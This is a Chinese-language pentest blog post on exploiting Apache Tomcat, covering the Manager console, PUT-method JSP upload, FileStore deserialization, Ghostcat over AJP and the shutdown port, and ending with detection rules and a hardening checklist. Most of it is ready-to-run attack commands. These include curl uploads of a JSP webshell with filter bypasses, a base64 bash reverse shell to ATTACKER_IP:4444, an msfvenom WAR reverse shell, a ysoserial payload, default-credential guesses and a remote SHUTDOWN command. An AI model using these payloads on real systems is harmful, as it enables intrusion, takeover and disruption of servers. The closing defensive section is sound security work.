---
title: "Apache Tomcat Manager / PUT 方法 / 反序列化 RCE 利用技术"
date: 2026-06-22T04:00:00+08:00
draft: false
weight: 105
description: "Apache Tomcat Java Web 容器渗透测试：Manager 后台 WAR 部署、CVE-2017-12615/12617 PUT 方法 RCE、CVE-2020-9484 FileStore 反序列化、AJP 协议攻击与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Apache Tomcat", "Manager", "PUT 方法", "反序列化", "CVE-2017-12615", "CVE-2020-9484", "AJP", "RCE", "渗透测试"]
---

## 0x00 攻击面总览

Apache Tomcat 是最流行的 Java Web 容器，暴露多个高危攻击面：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| HTTP | 8080 | HTTP | Web 应用服务 |
| HTTPS | 8443 | HTTPS | 加密 Web 服务 |
| Manager App | 8080/manager | HTTP | WAR 部署、应用管理 |
| Host Manager | 8080/host-manager | HTTP | 虚拟主机管理 |
| AJP | 8009 | TCP | Apache JServ Protocol |
| Shutdown Port | 8005 | TCP | 远程关闭（如启用） |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Apache Tomcat 攻击面                         │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ HTTP :8080   │    │ Manager      │    │ AJP :8009    │    │
│  │ Web 应用     │    │ /manager/html│    │ JServ 协议    │    │
│  │ PUT 方法RCE  │    │ WAR 部署     │    │ 文件包含      │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              Tomcat 进程 (JVM)                            │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① PUT 方法 → JSP 上传 → RCE (CVE-2017-12615/12617)      │ │
│  │  ② Manager 后台 → 弱凭据 → WAR 部署 → RCE                │ │
│  │  ③ FileStore 反序列化 → RCE (CVE-2020-9484)               │ │
│  │  ④ AJP 协议 → 文件包含 → 敏感文件读取                     │ │
│  │  ⑤ Shutdown Port → 远程关闭                               │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • Manager 后台可能使用默认/弱凭据                              │
│  • readonly=false 允许 PUT 方法上传                            │
│  • FileStore Session 持久化可能启用                             │
│  • AJP 端口默认开放                                            │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 8005,8009,8080,8443 \
  --script=http-title,http-enum \
  -oN tomcat_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
8005/tcp open  tcp         Apache Tomcat/Coyote JSP Engine (Shutdown Port)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat/Coyote JSP Engine
8443/tcp open  ssl/http    Apache Tomcat/Coyote JSP Engine
```

### 1.2 版本指纹

```bash
# 获取 Tomcat 版本
curl -s "http://target:8080/" | grep -i "tomcat"

# Manager 后台
curl -s "http://target:8080/manager/html" -u admin:admin

# AJP 协议探测
echo -ne "\x12\x34\x00\x01\x00" | nc -w3 target 8009 | xxd
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"Apache Tomcat"
port:8080 http.title:"Apache Tomcat"

# FOFA
body="Apache Tomcat" && port="8080"
app="Apache-Tomcat"
```

---

## 0x02 CVE-2017-12615 / CVE-2017-12617 — PUT 方法 RCE

### 2.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Tomcat 7.0.0 - 7.0.79 (Windows), 7.0.0 - 7.0.81 (全平台) |
| CVSS | 9.8（Critical） |
| 类型 | 任意文件上传 |
| 攻击向量 | HTTP PUT 方法 |
| 根因 | DefaultServlet readonly=false 允许 JSP 上传 |

### 2.2 漏洞利用

```bash
# 步骤 1：检查 PUT 方法是否可用
curl -s -X OPTIONS "http://target:8080/" -D -

# 如果响应包含 Allow: PUT，则可利用

# 步骤 2：上传 JSP WebShell
curl -s -X PUT "http://target:8080/shell.jsp/" \
  -d '<%@ page import="java.io.*" %><%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'

# Windows 使用尾部 / 绕过
# Linux 直接使用
curl -s -X PUT "http://target:8080/shell.jsp" \
  -d '<%@ page import="java.io.*" %><%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
```

### 2.3 绕过技巧

```bash
# Windows 尾部斜杠
curl -X PUT "http://target:8080/shell.jsp/" -d "webshell"

# URL 编码
curl -X PUT "http://target:8080/shell%2ejsp" -d "webshell"

# 分号截断
curl -X PUT "http://target:8080/shell.jsp;.png" -d "webshell"

# NTFS ADS（Windows）
curl -X PUT "http://target:8080/shell.jsp:hidden" -d "webshell"
```

### 2.4 验证执行

```bash
# 访问 WebShell
curl "http://target:8080/shell.jsp?cmd=id"

# 反弹 Shell
curl "http://target:8080/shell.jsp?cmd=bash+-c+{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}"
```

---

## 0x03 Manager 后台 — WAR 部署 RCE

### 3.1 默认凭据

```bash
# 常见默认凭据
# admin:admin
# tomcat:tomcat
# admin:password
# admin:123456
# manager:manager

# 尝试登录
curl -s "http://target:8080/manager/html" -u admin:admin -D - | grep -i "200"
```

### 3.2 WAR 部署

```bash
# 步骤 1：生成恶意 WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f war -o shell.war

# 步骤 2：通过 Manager API 部署
curl -s -u admin:admin -X PUT \
  "http://target:8080/manager/text/deploy?path=/shell&update=true" \
  -T shell.war

# 步骤 3：触发执行
curl "http://target:8080/shell/"
```

### 3.3 通过 REST API 管理

```bash
# 列出已部署应用
curl -s -u admin:admin "http://target:8080/manager/text/list"

# 重新加载应用
curl -s -u admin:admin "http://target:8080/manager/text/reload?path=/myapp"

# 停止应用
curl -s -u admin:admin "http://target:8080/manager/text/stop?path=/myapp"

# 启动应用
curl -s -u admin:admin "http://target:8080/manager/text/start?path=/myapp"

# 删除应用
curl -s -u admin:admin -X PUT "http://target:8080/manager/text/undeploy?path=/myapp"
```

---

## 0x04 CVE-2020-9484 — FileStore 反序列化 RCE

### 4.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Tomcat 10.0.0-M1 - 10.0.0-M4, 9.0.0.M1 - 9.0.34, 8.5.0 - 8.5.54, 7.0.0 - 7.0.103 |
| CVSS | 7.5（High） |
| 类型 | 反序列化 RCE |
| 攻击向量 | FileStore Session 持久化 |
| 根因 | ObjectInputStream 反序列化 .session 文件未做白名单限制 |

### 4.2 漏洞利用

```bash
# 步骤 1：生成反序列化 payload
ysoserial CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > payload.bin

# 步骤 2：上传 payload 到 Session 存储目录
# 需要知道 FileStore 的 directory 配置
curl -s -X PUT "http://target:8080/uploads/payload.session" --data-binary @payload.bin

# 步骤 3：触发反序列化
# 通过请求带有特定 Session ID 的页面触发
curl "http://target:8080/" -b "JSESSIONID=payload"
```

### 4.3 前提条件

- FileStore Session 持久化已启用
- 攻击者可以写入 .session 文件到 FileStore 目录
- 目标 classpath 中存在可利用的 Gadget 链

---

## 0x05 AJP 协议攻击

### 5.1 Ghostcat (CVE-2020-1938) — 文件包含

| 属性 | 详情 |
|------|------|
| 影响版本 | Tomcat 6.x, 7.x, 8.x, 9.x |
| CVSS | 9.8（Critical） |
| 类型 | 任意文件读取 / RCE |
| 攻击向量 | AJP 协议 (8009) |
| 根因 | AJP 协议允许攻击者指定包含文件属性 |

### 5.2 文件读取

```bash
# 使用 AJP 工具读取文件
python3 ajp_shooter.py --url http://target:8009 --file /WEB-INF/web.xml --read

# 读取敏感配置
python3 ajp_shooter.py --url http://target:8009 --file /WEB-INF/classes/db.properties --read
```

### 5.3 RCE（配合文件上传）

```bash
# 如果存在文件上传功能
# 步骤 1：上传图片马
# 步骤 2：通过 AJP 包含图片马作为 JSP 执行
python3 ajp_shooter.py --url http://target:8009 --file /uploads/image.jpg --include
```

---

## 0x06 Shutdown Port 攻击

### 6.1 远程关闭

```bash
# 如果 Shutdown Port (8005) 启用
# 发送 SHUTDOWN 命令
echo "SHUTDOWN" | nc target 8005

# Tomcat 将优雅关闭
```

---

## 0x07 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2017-12615 | 文件上传 RCE | 9.8 | PUT 方法 JSP 上传 |
| CVE-2017-12617 | 文件上传 RCE | 9.8 | PUT 方法 JSP 上传（全平台） |
| CVE-2020-9484 | 反序列化 RCE | 7.5 | FileStore Session 反序列化 |
| CVE-2020-1938 | 文件包含/RCE | 9.8 | AJP Ghostcat |
| CVE-2019-0232 | RCE | 10.0 | CGI Servlet RCE (Windows) |
| CVE-2020-11996 | DoS | 7.5 | HTTP/2 DoS |

---

## 0x08 蓝队检测方案

### 8.1 网络层检测

```yaml
title: Tomcat Manager 外部访问检测
id: tomcat-manager-external-access
status: experimental
description: 检测来自非内网段的 Tomcat Manager 访问
logsource:
  category: firewall
detection:
  selection:
    uri|contains:
      - "/manager/"
      - "/host-manager/"
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 8.2 PUT 方法检测

```yaml
title: Tomcat PUT 方法 JSP 上传检测
id: tomcat-put-jsp-upload
status: experimental
description: 检测通过 PUT 方法上传 JSP 文件的攻击
logsource:
  product: tomcat
  service: access
detection:
  selection:
    method: "PUT"
    uri|endswith:
      - ".jsp"
      - ".jsp/"
      - ".jspx"
  condition: selection
level: critical
```

### 8.3 审计日志分析

```bash
# 监控 Manager 登录
grep "/manager/" /opt/tomcat/logs/localhost_access_log.txt

# 检测 PUT 方法
grep "PUT" /opt/tomcat/logs/localhost_access_log.txt

# 检测 WAR 部署
grep -E "(deploy|undeploy)" /opt/tomcat/logs/catalina.out

# 检测 AJP 异常
grep "ajp" /opt/tomcat/logs/catalina.out

# 检测反序列化异常
grep -i "deserializ\|ObjectInputStream" /opt/tomcat/logs/catalina.out
```

### 8.4 加固清单

```
[ ] 升级至最新 Tomcat 版本修补所有已知 CVE
[ ] 禁用 PUT 方法：在 web.xml 中设置 readonly=true
[ ] 禁用 AJP 连接器（如不需要）：注释 server.xml 中的 AJP Connector
[ ] 修改 Manager 后台默认凭据为强密码
[ ] 限制 Manager 后台仅允许内网 IP 访问
[ ] 禁用 Shutdown Port（如不需要）
[ ] 禁用 FileStore Session 持久化（如不需要）
[ ] 配置反序列化白名单
[ ] 在前面放置反向代理并启用认证
[ ] 启用 HTTPS 并配置 TLS 证书
[ ] 隐藏 Tomcat 版本信息：server="Apache"
[ ] 启用审计日志并接入 SIEM
[ ] 监控 PUT 方法和 Manager 访问
[ ] 定期审查 tomcat-users.xml 配置
[ ] 使用 Security Manager 限制应用权限
```

---

## 0x09 渗透测试检查清单

```
[ ] 端口扫描：8005, 8009, 8080, 8443
[ ] Tomcat 版本检测
[ ] Manager 后台未授权访问测试（默认凭据）
[ ] PUT 方法可用性测试（OPTIONS）
[ ] CVE-2017-12615/12617 PUT 方法 JSP 上传测试
[ ] Manager WAR 部署测试
[ ] CVE-2020-9484 FileStore 反序列化测试
[ ] CVE-2020-1938 AJP Ghostcat 文件包含测试
[ ] Shutdown Port 远程关闭测试
[ ] AJP 端口开放状态检查
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
[ ] readonly 配置检查
[ ] 审计日志检查
```

---

## 0x10 小结

Apache Tomcat 的攻击面以 **Manager 后台** 和 **PUT 方法** 为核心。**CVE-2017-12615/12617** 通过 PUT 方法上传 JSP WebShell 实现 RCE（CVSS 9.8）。Manager 后台弱凭据允许攻击者部署恶意 WAR 实现 RCE。**CVE-2020-9484** 通过 FileStore Session 反序列化实现 RCE。**CVE-2020-1938 (Ghostcat)** 通过 AJP 协议实现任意文件读取或 RCE（CVSS 9.8）。蓝队应重点关注：升级至最新版本、禁用 PUT 方法和 AJP 连接器、修改 Manager 凭据、限制网络访问、将审计日志接入 SIEM。
